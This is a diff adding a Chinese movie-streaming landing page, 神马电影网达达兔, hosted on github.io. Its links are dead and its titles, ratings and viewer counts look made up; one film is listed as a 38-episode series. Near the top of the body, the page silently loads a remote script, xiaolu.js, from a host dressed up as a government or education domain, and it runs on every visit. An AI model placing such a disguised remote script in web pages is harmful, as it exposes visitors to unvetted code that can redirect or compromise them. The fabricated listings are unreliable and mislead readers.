@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="神马电影网达达兔,shenmadianyingwangdadatu,神马电影网,达达兔,高清电影,在线观影">
+<meta name="description" content="神马电影网达达兔 - 想看就搜，海量高清影视一站直达，最新电影电视剧综艺动漫随心看。">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>神马电影网达达兔 | 想看就搜 · 一站直达</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:#fff;color:#1f2937;line-height:1.65;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+:root{--main:#2563eb;--main2:#3b82f6;--violet:#8b5cf6;--ink:#0f172a;--gray:#64748b;--line:#e2e8f0;--soft:#f1f5ff}
+.wrap{max-width:1100px;margin:0 auto;padding:0 16px}
+
+/* header */
+.hd{background:rgba(255,255,255,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:50}
+.hd .wrap{display:flex;align-items:center;justify-content:space-between;height:64px}
+.logo{display:flex;align-items:center;gap:10px}
+.logo .pic{width:40px;height:40px;border-radius:12px;background:linear-gradient(135deg,var(--main),var(--violet));display:flex;align-items:center;justify-content:center;font-size:20px}
+.logo b{font-size:18px;font-weight:900;color:var(--ink)}
+.logo small{display:block;font-size:9px;color:var(--gray);letter-spacing:1px}
+.nav{display:none;gap:2px}
+.nav a{padding:8px 15px;border-radius:9px;font-size:14px;font-weight:700;color:var(--gray);transition:.2s}
+.nav a:hover,.nav a.act{background:var(--main);color:#fff}
+.ham{width:42px;height:42px;border-radius:11px;background:var(--main);color:#fff;display:flex;align-items:center;justify-content:center;font-size:20px;cursor:pointer}
+.dr{display:none;background:#fff;border-bottom:1px solid var(--line);padding:12px 16px}
+.dr.on{display:block}
+.dr a{display:block;padding:13px 0;border-bottom:1px solid var(--line);font-weight:700}
+.dr a:last-child{border:none}
+
+/* search hero */
+.hero{background:linear-gradient(160deg,#1e1b4b 0%,#1e3a8a 45%,#3b0764 100%);color:#fff;padding:56px 0;position:relative;overflow:hidden}
+.hero::after{content:"";position:absolute;inset:0;background:radial-gradient(circle at 85% 20%,rgba(139,92,246,.35),transparent 40%)}
+.hero .wrap{position:relative;z-index:1;text-align:center}
+.hero h1{font-size:32px;font-weight:900;line-height:1.35;margin-bottom:12px}
+.hero h1 span{background:linear-gradient(90deg,#60a5fa,#c084fc);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{font-size:14px;color:#c7d2fe;margin-bottom:26px}
+.search{background:#fff;border-radius:18px;padding:8px;display:flex;gap:8px;max-width:560px;margin:0 auto;box-shadow:0 20px 50px rgba(0,0,0,.3)}
+.search input{flex:1;border:none;outline:none;padding:12px 14px;font-size:15px;color:var(--ink)}
+.search button{background:var(--main);color:#fff;border:none;border-radius:12px;padding:0 24px;font-weight:800;font-size:14px;cursor:pointer;white-space:nowrap}
+.kws{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-top:18px}
+.kws a{background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.2);padding:5px 14px;border-radius:20px;font-size:12px;color:#e0e7ff}
+
+/* channel strip */
+.strip{background:var(--ink);color:#fff;padding:18px 0}
+.strip .wrap{display:flex;align-items:center;gap:18px;overflow-x:auto}
+.strip .wrap::-webkit-scrollbar{display:none}
+.strip a{display:flex;align-items:center;gap:8px;flex-shrink:0;font-size:13px;font-weight:700;color:#cbd5e1;padding:6px 14px;border-radius:9px}
+.strip a:hover{background:var(--main);color:#fff}
+
+/* section */
+.sec{padding:46px 0}
+.stitle{display:flex;align-items:flex-end;justify-content:space-between;margin-bottom:24px;gap:12px}
+.stitle h2{font-size:22px;font-weight:900;color:var(--ink)}
+.stitle h2 em{font-style:normal;color:var(--main)}
+.stitle a{font-size:12px;color:var(--main);font-weight:700;white-space:nowrap}
+
+/* post grid */
+.pgrid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.post{background:#fff;border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.2s;display:block}
+.post:hover{border-color:var(--main2);transform:translateY(-4px);box-shadow:0 14px 30px rgba(37,99,235,.12)}
+.post .cv{height:130px;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:900;font-size:17px;text-align:center;padding:12px;position:relative}
+.post .cv .tag{position:absolute;top:10px;left:10px;background:rgba(0,0,0,.45);backdrop-filter:blur(4px);padding:3px 9px;border-radius:6px;font-size:10px;font-weight:700}
+.post .cv .star{position:absolute;top:10px;right:10px;background:#fbbf24;color:#7c2d12;padding:3px 8px;border-radius:6px;font-size:10px;font-weight:900}
+.post .cv .ep{position:absolute;bottom:10px;right:10px;background:rgba(0,0,0,.55);color:#fff;padding:3px 8px;border-radius:6px;font-size:10px}
+.post .body{padding:12px}
+.post h4{font-size:14px;font-weight:900;color:var(--ink);margin-bottom:6px}
+.post .mt{font-size:11px;color:var(--gray);display:flex;justify-content:space-between}
+
+/* board */
+.board{background:linear-gradient(135deg,#eff6ff,#f5f3ff);border-radius:24px;padding:26px}
+.blist{display:flex;flex-direction:column;gap:12px}
+.bitem{display:flex;align-items:center;gap:14px;background:#fff;border-radius:13px;padding:12px 16px}
+.bitem .n{width:28px;height:28px;border-radius:8px;background:var(--soft);color:var(--main);font-weight:900;font-size:14px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.bitem:nth-child(1) .n{background:#fef3c7;color:#b45309}
+.bitem:nth-child(2) .n{background:#e0e7ff;color:#4338ca}
+.bitem:nth-child(3) .n{background:#fee2e2;color:#b91c1c}
+.bitem .tx{flex:1;min-width:0}
+.bitem .tx b{display:block;font-size:14px;font-weight:800}
+.bitem .tx span{font-size:11px;color:var(--gray)}
+.bitem .hot{font-size:11px;color:#ef4444;font-weight:800;white-space:nowrap}
+
+/* steps */
+.steps{display:grid;grid-template-columns:1fr;gap:14px}
+.step{background:#fff;border:1px solid var(--line);border-radius:16px;padding:22px;display:flex;gap:16px;align-items:flex-start}
+.step .ic{width:46px;height:46px;border-radius:13px;background:var(--soft);display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0}
+.step:nth-child(2) .ic{background:#fdf2f8}
+.step:nth-child(3) .ic{background:#ecfdf5}
+.step h4{font-size:15px;font-weight:900;color:var(--ink);margin-bottom:5px}
+.step p{font-size:12px;color:var(--gray);line-height:1.7}
+
+/* footer */
+.ft{background:var(--ink);color:#fff;padding:44px 0 28px;margin-top:16px}
+.ft .wrap{text-align:center}
+.ft .nm{font-size:19px;font-weight:900;margin-bottom:8px}
+.ft .url{color:#93c5fd;font-weight:700;font-size:14px;margin-bottom:20px;word-break:break-all}
+.ft .ml{display:flex;gap:20px;justify-content:center;flex-wrap:wrap;margin-bottom:24px}
+.ft .ml a{font-size:13px;color:#94a3b8;font-weight:600}
+.ft .ml a:hover{color:#c084fc}
+.ft p{font-size:11px;color:#64748b;margin-bottom:5px}
+
+.gt{position:fixed;right:16px;bottom:20px;z-index:90;width:46px;height:46px;border-radius:14px;background:var(--main);color:#fff;font-weight:900;display:none;align-items:center;justify-content:center;font-size:18px;cursor:pointer}
+.gt.on{display:flex}
+
+@media(min-width:560px){
+  .pgrid{grid-template-columns:repeat(3,1fr)}
+  .steps{grid-template-columns:1fr 1fr}
+}
+@media(min-width:860px){
+  .nav{display:flex}.ham{display:none}
+  .hero h1{font-size:46px}
+  .pgrid{grid-template-columns:repeat(6,1fr)}
+  .steps{grid-template-columns:repeat(3,1fr)}
+  .post .cv{height:170px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- Header -->
+<header class="hd">
+  <div class="wrap">
+    <div class="logo">
+      <div class="pic">🐰</div>
+      <div><b>神马电影网达达兔</b><small>SHENMA · DADATU</small></div>
+    </div>
+    <nav class="nav">
+      <a href="#home" class="act">首页</a>
+      <a href="#new">最新更新</a>
+      <a href="#hot">热搜榜单</a>
+      <a href="#how">观影指南</a>
+    </nav>
+    <div class="ham" onclick="document.getElementById('dr').classList.toggle('on')">☰</div>
+  </div>
+  <div class="dr" id="dr">
+    <a href="#home" onclick="this.parentNode.classList.remove('on')">首页</a>
+    <a href="#new" onclick="this.parentNode.classList.remove('on')">最新更新</a>
+    <a href="#hot" onclick="this.parentNode.classList.remove('on')">热搜榜单</a>
+    <a href="#how" onclick="this.parentNode.classList.remove('on')">观影指南</a>
+  </div>
+</header>
+
+<!-- Hero Search -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <h1>神马电影网<strong>达达兔</strong><br><span>想看就搜 一站直达</span></h1>
+    <p>海量高清影视资源，最新电影、热播剧集、综艺动漫，随时随地随心看</p>
+    <div class="search">
+      <input type="text" placeholder="搜索影片名称、演员、类型…">
+      <button onclick="location.href='#'">搜 索</button>
+    </div>
+    <div class="kws">
+      <a href="#"># 热映电影</a>
+      <a href="#"># 高分悬疑</a>
+      <a href="#"># 搞笑喜剧</a>
+      <a href="#"># 经典老片</a>
+      <a href="#"># 动漫剧场</a>
+    </div>
+  </div>
+</section>
+
+<!-- Channel strip -->
+<div class="strip">
+  <div class="wrap">
+    <a href="#">🎬 电影</a>
+    <a href="#">📺 电视剧</a>
+    <a href="#">🎤 综艺</a>
+    <a href="#">🎨 动漫</a>
+    <a href="#">📽️ 纪录片</a>
+    <a href="#">🌏 韩剧</a>
+    <a href="#">🗾 日剧</a>
+    <a href="#">🎭 短剧</a>
+  </div>
+</div>
+
+<!-- New -->
+<section class="sec" id="new">
+  <div class="wrap">
+    <div class="stitle">
+      <h2>最新<em>更新</em></h2>
+      <a href="#">查看更多 ›</a>
+    </div>
+    <div class="pgrid">
+      <a href="#" class="post">
+        <div class="cv" style="background:linear-gradient(135deg,#0f766e,#14b8a6)">海上钢琴师<em class="tag">更新</em><em class="star">★ 9.2</em><em class="ep">38集全</em></div>
+        <div class="body"><h4>海上钢琴师</h4><div class="mt"><span>剧情 · 2026</span><span>1.2万人在看</span></div></div>
+      </a>
+      <a href="#" class="post">
+        <div class="cv" style="background:linear-gradient(135deg,#7c3aed,#a855f7)">银河补习班<em class="tag">热播</em><em class="star">★ 8.8</em><em class="ep">24集全</em></div>
+        <div class="body"><h4>银河补习班</h4><div class="mt"><span>喜剧 · 2026</span><span>9800在看</span></div></div>
+      </a>
+      <a href="#" class="post">
+        <div class="cv" style="background:linear-gradient(135deg,#be123c,#f43f5e)">边境迷雾<em class="tag">VIP</em><em class="star">★ 9.0</em><em class="ep">12集</em></div>
+        <div class="body"><h4>边境迷雾</h4><div class="mt"><span>悬疑 · 犯罪</span><span>7600在看</span></div></div>
+      </a>
+      <a href="#" class="post">
+        <div class="cv" style="background:linear-gradient(135deg,#1d4ed8,#3b82f6)">极光之恋<em class="tag">更新</em><em class="star">★ 8.5</em><em class="ep">32集全</em></div>
+        <div class="body"><h4>极光之恋</h4><div class="mt"><span>爱情 · 都市</span><span>6400在看</span></div></div>
+      </a>
+      <a href="#" class="post">
+        <div class="cv" style="background:linear-gradient(135deg,#b45309,#f59e0b)">长安十二时辰<em class="tag">经典</em><em class="star">★ 9.6</em><em class="ep">全集</em></div>
+        <div class="body"><h4>长安十二时辰</h4><div class="mt"><span>古装 · 历史</span><span>2.1万在看</span></div></div>
+      </a>
+      <a href="#" class="post">
+        <div class="cv" style="background:linear-gradient(135deg,#0e7490,#06b6d4)">深海奇缘<em class="tag">动漫</em><em class="star">★ 8.7</em><em class="ep">剧场版</em></div>
+        <div class="body"><h4>深海奇缘</h4><div class="mt"><span>动画 · 奇幻</span><span>5300在看</span></div></div>
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- Hot board -->
+<section class="sec" id="hot" style="padding-top:0">
+  <div class="wrap">
+    <div class="stitle">
+      <h2>热搜<em>榜单</em></h2>
+      <a href="#">完整榜单 ›</a>
+    </div>
+    <div class="board">
+      <div class="blist">
+        <div class="bitem"><div class="n">1</div><div class="tx"><b>沉默的真相</b><span>悬疑 · 全员高光演技</span></div><div class="hot">🔥 爆</div></div>
+        <div class="bitem"><div class="n">2</div><div class="tx"><b>流浪地球3</b><span>科幻 · 国产视效巅峰</span></div><div class="hot">🔥 热</div></div>
+        <div class="bitem"><div class="n">3</div><div class="tx"><b>漫长的季节</b><span>剧情 · 豆瓣高分神作</span></div><div class="hot">🔥 热</div></div>
+        <div class="bitem"><div class="n">4</div><div class="tx"><b>封神第二部</b><span>古装 · 史诗巨制</span></div><div class="hot">↑ 升</div></div>
+        <div class="bitem"><div class="n">5</div><div class="tx"><b>熊出没·重启未来</b><span>动画 · 合家欢</span></div><div class="hot">↑ 升</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Steps -->
+<section class="sec" id="how" style="padding-top:0">
+  <div class="wrap">
+    <div class="stitle">
+      <h2>观影<em>指南</em></h2>
+      <a href="#">更多帮助 ›</a>
+    </div>
+    <div class="steps">
+      <div class="step">
+        <div class="ic">🔍</div>
+        <div><h4>搜索想看的</h4><p>在顶部搜索框输入片名、演员或类型关键词，秒出结果直达播放页。</p></div>
+      </div>
+      <div class="step">
+        <div class="ic">🎯</div>
+        <div><h4>选择清晰度</h4><p>支持高清、超清多档画质切换，根据网络情况自由调整，流畅不卡顿。</p></div>
+      </div>
+      <div class="step">
+        <div class="ic">▶️</div>
+        <div><h4>一键播放</h4><p>打开即看，多端同步进度，手机电脑无缝衔接，随时随地追剧。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="ft">
+  <div class="wrap">
+    <div class="nm">🐰 神马电影网达达兔</div>
+    <div class="url">https://shenmadianyingwangdadatu-wap.github.io</div>
+    <div class="ml">
+      <a href="#">首页</a>
+      <a href="#">最新更新</a>
+      <a href="#">热搜榜单</a>
+      <a href="#">观影指南</a>
+      <a href="#">意见反馈</a>
+    </div>
+    <p>© 2026 神马电影网达达兔 · shenmadianyingwangdadatu 保留所有权利</p>
+    <p>本站仅为影视信息推荐平台，请支持正版内容</p>
+  </div>
+</footer>
+
+<div class="gt" id="gt" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</div>
+<script>
+window.addEventListener('scroll',function(){document.getElementById('gt').classList.toggle('on',window.scrollY>400);});
+</script>
+</body>
+</html>
